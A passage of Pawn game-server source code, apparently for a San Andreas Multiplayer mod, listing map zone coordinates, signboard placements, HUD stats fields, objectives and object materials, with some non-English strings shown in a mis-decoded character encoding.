	{"East Beach",2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90},
	{"East Beach",2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90},
	{"East Los Santos",2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90},
	{"East Los Santos",2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90},
	{"East Los Santos",2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90},
	{"East Los Santos",2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90},
	{"East Los Santos",2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90},
	{"East Los Santos",2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90},
	{"East Los Santos",2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90},
	{"Easter Basin",-1794.90,249.90,-9.10,-1242.90,578.30,200.00},
	{"Easter Basin",-1794.90,-50.00,-0.00,-1499.80,249.90,200.00},
	{"Easter Bay Airport",-1499.80,-50.00,-0.00,-1242.90,249.90,200.00},
	{"Easter Bay Airport",-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00},
	{"Easter Bay Airport",-1213.90,-730.10,0.00,-1132.80,-50.00,200.00},
	{"Easter Bay Airport",-1242.90,-50.00,0.00,-1213.90,578.30,200.00},
	{"Easter Bay Airport",-1213.90,-50.00,-4.50,-947.90,578.30,200.00},
	{"Easter Bay Airport",-1315.40,-405.30,15.40,-1264.40,-209.50,25.40},
	{"Easter Bay Airport",-1354.30,-287.30,15.40,-1315.40,-209.50,25.40},
	{"Easter Bay Airport",-1490.30,-209.50,15.40,-1264.40,-148.30,25.40},
	{"Easter Bay Chemicals",-1132.80,-768.00,0.00,-956.40,-578.10,200.00},
	{"Easter Bay Chemicals",-1132.80,-787.30,0.00,-956.40,-768.00,200.00},
	{"El Castillo del Diablo",-464.50,2217.60,0.00,-208.50,2580.30,200.00},
	{"El Castillo del Diablo",-208.50,2123.00,-7.60,114.00,2337.10,200.00},
	{"El Castillo del Diablo",-208.50,2337.10,0.00,8.40,2487.10,200.00},
	{"El Corona",1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90},
	{"El Corona",1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90},
	{"El Quebrados",-1645.20,2498.50,0.00,-1372.10,2777.80,200.00},
	{"Esplanade East",-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00},
	{"Esplanade East",-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00},
	{"Esplanade East",-1499.80,578.30,-79.60,-1339.80,1274.20,20.30},
	{"Esplanade North",-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00},
	{"Esplanade North",-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00},
	{"Esplanade North",-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00},
	{"Fallen Tree",-792.20,-698.50,-5.30,-452.40,-380.00,200.00},
	{"Fallow Bridge",434.30,366.50,0.00,603.00,555.60,200.00},
	{"Fern Ridge",508.10,-139.20,0.00,1306.60,119.50,200.00},
	{"Financial",-1871.70,744.10,-6.10,-1701.30,1176.40,300.00},
	{"Fisher's Lagoon",1916.90,-233.30,-100.00,2131.70,13.80,200.00},
	{"Flint Intersection",-187.70,-1596.70,-89.00,17.00,-1276.60,110.90},
	{"Flint Range",-594.10,-1648.50,0.00,-187.70,-1276.60,200.00},
	{"Fort Carson",-376.20,826.30,-3.00,123.70,1220.40,200.00},
	{"Foster Valley",-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00},
	{"Foster Valley",-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00},
	{"Foster Valley",-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00},
	{"Foster Valley",-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00},
	{"Frederick Bridge",2759.20,296.50,0.00,2774.20,594.70,200.00},
	{"Gant Bridge",-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00},
	{"Gant Bridge",-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00},
	{"Ganton",2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90},
	{"Ganton",2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90},
	{"Garcia",-2411.20,-222.50,-0.00,-2173.00,265.20,200.00},
	{"Garcia",-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00},
	{"Garver Bridge",-1339.80,828.10,-89.00,-1213.90,1057.00,110.90},
	{"Garver Bridge",-1213.90,950.00,-89.00,-1087.90,1178.90,110.90},
	{"Garver Bridge",-1499.80,696.40,-179.60,-1339.80,925.30,20.30},
	{"Glen Park",1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90},
	{"Glen Park",1812.60,-1100.80,-89.00,1994.30,-973.30,110.90},
	{"Glen Park",1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90},
	{"Green Palms",176.50,1305.40,-3.00,338.60,1520.70,200.00},
	{"Greenglass College",964.30,1044.60,-89.00,1197.30,1203.20,110.90},
	{"Greenglass College",964.30,930.80,-89.00,1166.50,1044.60,110.90},
	{"Hampton Barns",603.00,264.30,0.00,761.90,366.50,200.00},
	{"Hankypanky Point",2576.90,62.10,0.00,2759.20,385.50,200.00},
	{"Harry Gold Parkway",1777.30,863.20,-89.00,1817.30,2342.80,110.90},
	{"Hashbury",-2593.40,-222.50,-0.00,-2411.20,54.70,200.00},
	{"Hilltop Farm",967.30,-450.30,-3.00,1176.70,-217.90,200.00},
	{"Hunter Quarry",337.20,710.80,-115.20,860.50,1031.70,203.70},
	{"Idlewood",1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90},
	{"Idlewood",1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90},
	{"Idlewood",1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90},
	{"Idlewood",1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90},
	{"Idlewood",2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90},
	{"Idlewood",1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90},
	{"Jefferson",1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90},
	{"Jefferson",2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90},
	{"Jefferson",2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90},
	{"Jefferson",2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90},
	{"Jefferson",2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90},
	{"Jefferson",2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90},
	{"Julius Thruway East",2623.10,943.20,-89.00,2749.90,1055.90,110.90},
	{"Julius Thruway East",2685.10,1055.90,-89.00,2749.90,2626.50,110.90},
	{"Julius Thruway East",2536.40,2442.50,-89.00,2685.10,2542.50,110.90},
	{"Julius Thruway East",2625.10,2202.70,-89.00,2685.10,2442.50,110.90},
	{"Julius Thruway North",2498.20,2542.50,-89.00,2685.10,2626.50,110.90},
	{"Julius Thruway North",2237.40,2542.50,-89.00,2498.20,2663.10,110.90},
	{"Julius Thruway North",2121.40,2508.20,-89.00,2237.40,2663.10,110.90},
	{"Julius Thruway North",1938.80,2508.20,-89.00,2121.40,2624.20,110.90},
	{"Julius Thruway North",1534.50,2433.20,-89.00,1848.40,2583.20,110.90},
	{"Julius Thruway North",1848.40,2478.40,-89.00,1938.80,2553.40,110.90},
	{"Julius Thruway North",1704.50,2342.80,-89.00,1848.40,2433.20,110.90},
	{"Julius Thruway North",1377.30,2433.20,-89.00,1534.50,2507.20,110.90},
	{"Julius Thruway South",1457.30,823.20,-89.00,2377.30,863.20,110.90},
	{"Julius Thruway South",2377.30,788.80,-89.00,2537.30,897.90,110.90},
	{"Julius Thruway West",1197.30,1163.30,-89.00,1236.60,2243.20,110.90},
	{"Julius Thruway West",1236.60,2142.80,-89.00,1297.40,2243.20,110.90},
	{"Juniper Hill",-2533.00,578.30,-7.60,-2274.10,968.30,200.00},
	{"Juniper Hollow",-2533.00,968.30,-6.10,-2274.10,1358.90,200.00},
	{"K.A.C.C. Military Fuels",2498.20,2626.50,-89.00,2749.90,2861.50,110.90},
	{"Kincaid Bridge",-1339.80,599.20,-89.00,-1213.90,828.10,110.90},
	{"Kincaid Bridge",-1213.90,721.10,-89.00,-1087.90,950.00,110.90},
	{"Kincaid Bridge",-1087.90,855.30,-89.00,-961.90,986.20,110.90},
	{"Wangs",-2329.30,458.40,-7.60,-1993.20,578.30,200.00},
	{"Wangs",-2411.20,265.20,-9.10,-1993.20,373.50,200.00},
	{"Wangs",-2253.50,373.50,-9.10,-1993.20,458.40,200.00},
	{"LVA Freight Depot",1457.30,863.20,-89.00,1777.40,1143.20,110.90},
	{"LVA Freight Depot",1375.60,919.40,-89.00,1457.30,1203.20,110.90},
	{"LVA Freight Depot",1277.00,1087.60,-89.00,1375.60,1203.20,110.90},
	{"LVA Freight Depot",1315.30,1044.60,-89.00,1375.60,1087.60,110.90},
	{"LVA Freight Depot",1236.60,1163.40,-89.00,1277.00,1203.20,110.90},
	{"Las Barrancas",-926.10,1398.70,-3.00,-719.20,1634.60,200.00},
	{"Las Brujas",-365.10,2123.00,-3.00,-208.50,2217.60,200.00},
	{"Las Colinas",1994.30,-1100.80,-89.00,2056.80,-920.80,110.90},
	{"Las Colinas",2056.80,-1126.30,-89.00,2126.80,-920.80,110.90},
	{"Las Colinas",2185.30,-1154.50,-89.00,2281.40,-934.40,110.90},
	{"Las Colinas",2126.80,-1126.30,-89.00,2185.30,-934.40,110.90},
	{"Las Colinas",2747.70,-1120.00,-89.00,2959.30,-945.00,110.90},
	{"Las Colinas",2632.70,-1135.00,-89.00,2747.70,-945.00,110.90},
	{"Las Colinas",2281.40,-1135.00,-89.00,2632.70,-945.00,110.90},
	{"Las Payasadas",-354.30,2580.30,2.00,-133.60,2816.80,200.00},
	{"Las Venturas Airport",1236.60,1203.20,-89.00,1457.30,1883.10,110.90},
	{"Las Venturas Airport",1457.30,1203.20,-89.00,1777.30,1883.10,110.90},
	{"Las Venturas Airport",1457.30,1143.20,-89.00,1777.40,1203.20,110.90},
	{"Las Venturas Airport",1515.80,1586.40,-12.50,1729.90,1714.50,87.50},
	{"Last Dime Motel",1823.00,596.30,-89.00,1997.20,823.20,110.90},
	{"Leafy Hollow",-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00},
	{"Lil' Probe Inn",-90.20,1286.80,-3.00,153.80,1554.10,200.00},
	{"Linden Side",2749.90,943.20,-89.00,2923.30,1198.90,110.90},
	{"Linden Station",2749.90,1198.90,-89.00,2923.30,1548.90,110.90},
	{"Linden Station",2811.20,1229.50,-39.50,2861.20,1407.50,60.40},
	{"Little Mexico",1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90},
	{"Little Mexico",1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90},
	{"Los Flores",2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90},
	{"Los Flores",2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90},
	{"Los Santos International",1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90},
	{"Los Santos International",1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90},
	{"Los Santos International",1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90},
	{"Los Santos International",1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90},
	{"Los Santos International",1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90},
	{"Los Santos International",2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90},
	{"Marina",647.70,-1804.20,-89.00,851.40,-1577.50,110.90},
	{"Marina",647.70,-1577.50,-89.00,807.90,-1416.20,110.90},
	{"Marina",807.90,-1577.50,-89.00,926.90,-1416.20,110.90},
	{"Taxi HQ",787.40,-1416.20,-89.00,1072.60,-1310.20,110.90},
	{"Taxi HQ",952.60,-1310.20,-89.00,1072.60,-1130.80,110.90},
	{"Taxi HQ",1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90},
	{"Taxi HQ",926.90,-1577.50,-89.00,1370.80,-1416.20,110.90},
	{"Market Station",787.40,-1410.90,-34.10,866.00,-1310.20,65.80},
	{"Martin Bridge",-222.10,293.30,0.00,-122.10,476.40,200.00},
	{"Missionary Hill",-2994.40,-811.20,0.00,-2178.60,-430.20,200.00},
	{"Montgomery",1119.50,119.50,-3.00,1451.40,493.30,200.00},
	{"Montgomery",1451.40,347.40,-6.10,1582.40,420.80,200.00},
	{"Montgomery Intersection",1546.60,208.10,0.00,1745.80,347.40,200.00},
	{"Montgomery Intersection",1582.40,347.40,0.00,1664.60,401.70,200.00},
	{"Mulholland",1414.00,-768.00,-89.00,1667.60,-452.40,110.90},
	{"Mulholland",1281.10,-452.40,-89.00,1641.10,-290.90,110.90},
	{"Mulholland",1269.10,-768.00,-89.00,1414.00,-452.40,110.90},
	{"Mulholland",1357.00,-926.90,-89.00,1463.90,-768.00,110.90},
	{"Mulholland",1318.10,-910.10,-89.00,1357.00,-768.00,110.90},
	{"Mulholland",1169.10,-910.10,-89.00,1318.10,-768.00,110.90},
	{"Mulholland",768.60,-954.60,-89.00,952.60,-860.60,110.90},
	{"Mulholland",687.80,-860.60,-89.00,911.80,-768.00,110.90},
	{"Mulholland",737.50,-768.00,-89.00,1142.20,-674.80,110.90},
	{"Mulholland",1096.40,-910.10,-89.00,1169.10,-768.00,110.90},
	{"Mulholland",952.60,-937.10,-89.00,1096.40,-860.60,110.90},
	{"Mulholland",911.80,-860.60,-89.00,1096.40,-768.00,110.90},
	{"Mulholland",861.00,-674.80,-89.00,1156.50,-600.80,110.90},
	{"Mulholland Intersection",1463.90,-1150.80,-89.00,1812.60,-768.00,110.90},
	{"North Rock",2285.30,-768.00,0.00,2770.50,-269.70,200.00},
	{"Ocean Docks",2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90},
	{"Ocean Docks",2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90},
	{"Ocean Docks",2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90},
	{"Ocean Docks",2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90},
	{"Ocean Docks",2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90},
	{"Ocean Docks",2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90},
	{"Ocean Docks",2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90},
	{"Ocean Flats",-2994.40,277.40,-9.10,-2867.80,458.40,200.00},
	{"Ocean Flats",-2994.40,-222.50,-0.00,-2593.40,277.40,200.00},
	{"Ocean Flats",-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00},
	{"Octane Springs",338.60,1228.50,0.00,664.30,1655.00,200.00},
	{"Old Venturas Strip",2162.30,2012.10,-89.00,2685.10,2202.70,110.90},
	{"Palisades",-2994.40,458.40,-6.10,-2741.00,1339.60,200.00},
	{"Palomino Creek",2160.20,-149.00,0.00,2576.90,228.30,200.00},
	{"Paradiso",-2741.00,793.40,-6.10,-2533.00,1268.40,200.00},
	{"Pershing Square",1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90},
	{"Pilgrim",2437.30,1383.20,-89.00,2624.40,1783.20,110.90},
	{"Pilgrim",2624.40,1383.20,-89.00,2685.10,1783.20,110.90},
	{"Pilson Intersection",1098.30,2243.20,-89.00,1377.30,2507.20,110.90},
	{"Pirates in Men's Pants",1817.30,1469.20,-89.00,2027.40,1703.20,110.90},
	{"Playa del Seville",2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90},
	{"Prickle Pine",1534.50,2583.20,-89.00,1848.40,2863.20,110.90},
	{"Prickle Pine",1117.40,2507.20,-89.00,1534.50,2723.20,110.90},
	{"Prickle Pine",1848.40,2553.40,-89.00,1938.80,2863.20,110.90},
	{"Prickle Pine",1938.80,2624.20,-89.00,2121.40,2861.50,110.90},
	{"Queens",-2533.00,458.40,0.00,-2329.30,578.30,200.00},
	{"Queens",-2593.40,54.70,0.00,-2411.20,458.40,200.00},
	{"Queens",-2411.20,373.50,0.00,-2253.50,458.40,200.00},
	{"Randolph Industrial Estate",1558.00,596.30,-89.00,1823.00,823.20,110.90},
	{"Redsands East",1817.30,2011.80,-89.00,2106.70,2202.70,110.90},
	{"Redsands East",1817.30,2202.70,-89.00,2011.90,2342.80,110.90},
	{"Redsands East",1848.40,2342.80,-89.00,2011.90,2478.40,110.90},
	{"Redsands West",1236.60,1883.10,-89.00,1777.30,2142.80,110.90},
	{"Redsands West",1297.40,2142.80,-89.00,1777.30,2243.20,110.90},
	{"Redsands West",1377.30,2243.20,-89.00,1704.50,2433.20,110.90},
	{"Redsands West",1704.50,2243.20,-89.00,1777.30,2342.80,110.90},
	{"Regular Tom",-405.70,1712.80,-3.00,-276.70,1892.70,200.00},
	{"Richman",647.50,-1118.20,-89.00,787.40,-954.60,110.90},
	{"Richman",647.50,-954.60,-89.00,768.60,-860.60,110.90},
	{"Richman",225.10,-1369.60,-89.00,334.50,-1292.00,110.90},
	{"Richman",225.10,-1292.00,-89.00,466.20,-1235.00,110.90},
	{"Richman",72.60,-1404.90,-89.00,225.10,-1235.00,110.90},
	{"Richman",72.60,-1235.00,-89.00,321.30,-1008.10,110.90},
	{"Richman",321.30,-1235.00,-89.00,647.50,-1044.00,110.90},
	{"Richman",321.30,-1044.00,-89.00,647.50,-860.60,110.90},
	{"Richman",321.30,-860.60,-89.00,687.80,-768.00,110.90},
	{"Richman",321.30,-768.00,-89.00,700.70,-674.80,110.90},
	{"Robada Intersection",-1119.00,1178.90,-89.00,-862.00,1351.40,110.90},
	{"Cop HQ",2237.40,2202.70,-89.00,2536.40,2542.50,110.90},
	{"Cop HQ",2536.40,2202.70,-89.00,2625.10,2442.50,110.90},
	{"Rockshore East",2537.30,676.50,-89.00,2902.30,943.20,110.90},
	{"Rockshore West",1997.20,596.30,-89.00,2377.30,823.20,110.90},
	{"Rockshore West",2377.30,596.30,-89.00,2537.30,788.80,110.90},
	{"Rodeo",72.60,-1684.60,-89.00,225.10,-1544.10,110.90},
	{"Rodeo",72.60,-1544.10,-89.00,225.10,-1404.90,110.90},
	{"Rodeo",225.10,-1684.60,-89.00,312.80,-1501.90,110.90},
	{"Rodeo",225.10,-1501.90,-89.00,334.50,-1369.60,110.90},
	{"Rodeo",334.50,-1501.90,-89.00,422.60,-1406.00,110.90},
	{"Rodeo",312.80,-1684.60,-89.00,422.60,-1501.90,110.90},
	{"Rodeo",422.60,-1684.60,-89.00,558.00,-1570.20,110.90},
	{"Rodeo",558.00,-1684.60,-89.00,647.50,-1384.90,110.90},
	{"Rodeo",466.20,-1570.20,-89.00,558.00,-1385.00,110.90},
	{"Rodeo",422.60,-1570.20,-89.00,466.20,-1406.00,110.90},
	{"Rodeo",466.20,-1385.00,-89.00,647.50,-1235.00,110.90},
	{"Rodeo",334.50,-1406.00,-89.00,466.20,-1292.00,110.90},
	{"Royal Casino",2087.30,1383.20,-89.00,2437.30,1543.20,110.90},
	{"San Andreas Sound",2450.30,385.50,-100.00,2759.20,562.30,200.00},
	{"Santa Flora",-2741.00,458.40,-7.60,-2533.00,793.40,200.00},
	{"Santa Maria Beach",342.60,-2173.20,-89.00,647.70,-1684.60,110.90},
	{"Santa Maria Beach",72.60,-2173.20,-89.00,342.60,-1684.60,110.90},
	{"Shady Cabin",-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00},
	{"Shady Creeks",-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00},
	{"Shady Creeks",-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00},
	{"Sobell Rail Yards",2749.90,1548.90,-89.00,2923.30,1937.20,110.90},
	{"Spinybed",2121.40,2663.10,-89.00,2498.20,2861.50,110.90},
	{"Starfish Casino",2437.30,1783.20,-89.00,2685.10,2012.10,110.90},
	{"Starfish Casino",2437.30,1858.10,-39.00,2495.00,1970.80,60.90},
	{"Starfish Casino",2162.30,1883.20,-89.00,2437.30,2012.10,110.90},
	{"Temple",1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90},
	{"Temple",1252.30,-1026.30,-89.00,1391.00,-926.90,110.90},
	{"Temple",1252.30,-926.90,-89.00,1357.00,-910.10,110.90},
	{"Temple",952.60,-1130.80,-89.00,1096.40,-937.10,110.90},
	{"Temple",1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90},
	{"Temple",1096.40,-1026.30,-89.00,1252.30,-910.10,110.90},
	{"The Camel's Toe",2087.30,1203.20,-89.00,2640.40,1383.20,110.90},
	{"The Clown's Pocket",2162.30,1783.20,-89.00,2437.30,1883.20,110.90},
	{"The Emerald Isle",2011.90,2202.70,-89.00,2237.40,2508.20,110.90},
	{"The Farm",-1209.60,-1317.10,114.90,-908.10,-787.30,251.90},
	{"The Four Dragons Casino",1817.30,863.20,-89.00,2027.30,1083.20,110.90},
	{"The High Roller",1817.30,1283.20,-89.00,2027.30,1469.20,110.90},
	{"The Mako Span",1664.60,401.70,0.00,1785.10,567.20,200.00},
	{"The Panopticon",-947.90,-304.30,-1.10,-319.60,327.00,200.00},
	{"The Pink Swan",1817.30,1083.20,-89.00,2027.30,1283.20,110.90},
	{"The Sherman Dam",-968.70,1929.40,-3.00,-481.10,2155.20,200.00},
	{"The Strip",2027.40,863.20,-89.00,2087.30,1703.20,110.90},
	{"The Strip",2106.70,1863.20,-89.00,2162.30,2202.70,110.90},
	{"The Strip",2027.40,1783.20,-89.00,2162.30,1863.20,110.90},
	{"The Strip",2027.40,1703.20,-89.00,2137.40,1783.20,110.90},
	{"The Visage",1817.30,1863.20,-89.00,2106.70,2011.80,110.90},
	{"The Visage",1817.30,1703.20,-89.00,2027.40,1863.20,110.90},
	{"Unity Station",1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50},
	{"Valle Ocultado",-936.60,2611.40,2.00,-715.90,2847.90,200.00},
	{"Verdant Bluffs",930.20,-2488.40,-89.00,1249.60,-2006.70,110.90},
	{"Verdant Bluffs",1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90},
	{"Verdant Bluffs",1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90},
	{"Pilot HQ",37.00,2337.10,-3.00,435.90,2677.90,200.00},
	{"Verona Beach",647.70,-2173.20,-89.00,930.20,-1804.20,110.90},
	{"Verona Beach",930.20,-2006.70,-89.00,1073.20,-1804.20,110.90},
	{"Verona Beach",851.40,-1804.20,-89.00,1046.10,-1577.50,110.90},
	{"Verona Beach",1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90},
	{"Verona Beach",1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90},
	{"Vinewood",787.40,-1310.20,-89.00,952.60,-1130.80,110.90},
	{"Vinewood",787.40,-1130.80,-89.00,952.60,-954.60,110.90},
	{"Vinewood",647.50,-1227.20,-89.00,787.40,-1118.20,110.90},
	{"Vinewood",647.70,-1416.20,-89.00,787.40,-1227.20,110.90},
	{"Whitewood Estates",883.30,1726.20,-89.00,1098.30,2507.20,110.90},
	{"Whitewood Estates",1098.30,1726.20,-89.00,1197.30,2243.20,110.90},
	{"Willowfield",1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90},
	{"Willowfield",2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90},
	{"Willowfield",2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90},
	{"Willowfield",2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90},
	{"Willowfield",2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90},
	{"Willowfield",2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90},
	{"Willowfield",2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90},
	{"Yellow Bell Station",1377.40,2600.40,-21.90,1492.40,2687.30,78.00},
	{"Los Santos",44.60,-2892.90,-242.90,2997.00,-768.00,900.00},
	{"Las Venturas",869.40,596.30,-242.90,2997.00,2993.80,900.00},
	{"Admin Island",-480.50,596.30,-242.90,869.40,2993.80,900.00},
	{"Tierra Robada",-2997.40,1659.60,-242.90,-480.50,2993.80,900.00},
	{"Tierra Robada",-1213.90,596.30,-242.90,-480.50,1659.60,900.00},
	{"San Fierro",-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00},
	{"Red County",-1213.90,-768.00,-242.90,2997.00,596.30,900.00},
	{"Flint County",-1213.90,-2892.90,-242.90,44.60,-768.00,900.00},
	{"Whetstone",-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}
};
new Signboards[][SignboardData] =
{
	// key, model, coords, size, current, type
	{"RaceWall",19353,{2017.41,916.52,11.57,0.00,0.00,0.00},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"LV",19353,{2092.88,1285.84,11.55,0.00,0.00,0.00},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"Pirate",19353,{2015.63,1537.55,10.15,0.00,0.00,0.00},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"Ammunation",19353,{2157.47,938.34,9.93,0.00,0.00,358.89},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"AmmunationSide",19353,{2197.32,960.72,11.89,0.00,0.00,270.66},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"RaceSignboard1",8332,{1787.71,1076.06,25.98,356.86,0.00,3.14},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"RaceSignboard2",8331,{1772.54,1210.30,28.53,356.86,0.00,3.14},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"RaceSignboard3",8330,{1787.64,1475.65,25.98,356.86,0.00,3.14},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"RaceSignboard4",7910,{1785.58,1790.87,25.27,3.14,0.00,3.14},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"RaceSignboard5",7909,{1785.60,1978.31,25.27,3.14,0.00,3.14},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_auto},
	{"LVSignboard1",7912,{1386.15,2380.20,31.16,3.14,0.00,3.14},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_clans},
	{"LVSignboard2",7912,{1386.15,2380.20,31.16,3.14,0.00,3.14},OBJECT_MATERIAL_SIZE_256x128,-1,sbu_clans}
};
new StatsFields[][StatsFieldsEnum] =
{
	{"Stats","~y~~h~","hud:radar_savegame",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	{"Profile","~g~~h~","hud:radar_gangg",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	{"Groups","~b~~h~","hud:radar_hostpital",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	{"Weapons","~r~~h~","hud:radar_ammugun",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	{"Properties","~g~~h~~h~~h~","hud:radar_propertyg",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	{"Vehicles","~p~~h~","hud:radar_impound",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	//{"House","~b~~h~~h~~h~","hud:radar_propertyr",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	{"Objectives","~y~~h~~h~~h~","hud:radar_race",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}},
	{"Activities","~r~~h~~h~","hud:radar_flag",{INVALID_TEXT_DRAW,INVALID_TEXT_DRAW}}
};
new Objectives[][ObjectivesEnum] =
{
	{0b00000001,"ч°∙я ю·чщь",".AFK ∙чў с∙°· 3 ∙Єх· с°Ўє! Ёщ·я ь°рх· сёшршё ыюф ∙щчў·э Єу Єы∙щх, ьр ыхьь"},
	{0b00000010,"ч°∙я ю·ўуэ",".AFK ∙чў с∙°· 6 ∙Єх· с°Ўє! Ёщ·я ь°рх· сёшршё ыюф ∙щчў·э Єу Єы∙щх, ьр ыхьь"},
	{0b00000011,"ющьщхЁ°",".фЇўу ссЁў ющьщхя ухь° сущхў"},
	{0b00000100,"Ўщщу Є∙щ°щэ",".ф°хт ∙чўя Єэ ющьщхя ухь° рх юЄь"},
	{0b00000101,"°хЎч",".ф°хт сю∙чў рчу сьщ щЎщрф юф∙°· 5 ∙чўЁщэ Єэ ёыщя"},
	{0b00000110,"рщ∙ Єёўщэ",".·фщф фсЄьщэ ∙ь " #max_player_props " Ёыёщэ сх цюЁщ·"},
	{0b00000111,"ёшрЁш°","/Stunting ф∙ьэ сю∙чў рчу сьщ щЎщрф юф∙°· р· ыь фю∙щюх· ∙ь"},
	{0b00001000,"ЎЁчя юўЎхЄщ","/Shooting ф∙ьэ сю∙чў рчу сьщ щЎщрф юф∙°· р· ыь фю∙щюх· ∙ь"},
	{0b00001001,"ущщўя","Єсх° р· юшххч фщ°щх· счЁх· фЁ∙ўщэ, с°юф фыщ ў∙ф Єэ 100 рчхц ЇтщЄф"},
	{0b00001010,"ёрхя Ї°х",".Sawnoff Shotgun ф°хт сю∙чў рчу сьщ щЎщрф 150 ∙чўЁщэ Єэ"}/*,
	{0b00001010,"",""},
	{0b00001011,"",""},
	{0b00001100,"",""},
	{0b00001101,"",""},
	{0b00001110,"",""},
	{0b00001111,"",""}*/
};
new ObjectMaterials[][ObjectMaterialsEnum] =
{
	{"у∙р",3908,"libertyfar","Grass_128HV"},
	{"∙ьт",3942,"bistro","mp_snow"},
	{"ющэ",3953,"rczero_track","waterclear256"},
	{"рся",3933,"weemap","rocktb128"},
	{"чхь",4242,"seabed","sw_sand"},
	{"ёхЇ· чхь",16008,"des_n","des_ripplsand"},
	{"Єї",16407,"des_airfieldhus","btdeck256"},
	{"рся ёухўф",16571,"des_se1","des_crackeddirt1"},
	{"ьсф",18752,"Volcano","lavalake"},
	{"ущёўх",19128,"dancefloors","dancefloor1"},
	{"ю·ы·",964,"cj_crate_will","CJ_FLIGHT_CASE"},
	{"Єї сфщ°",16005,"des_stownmain2","des_redslats"}
};
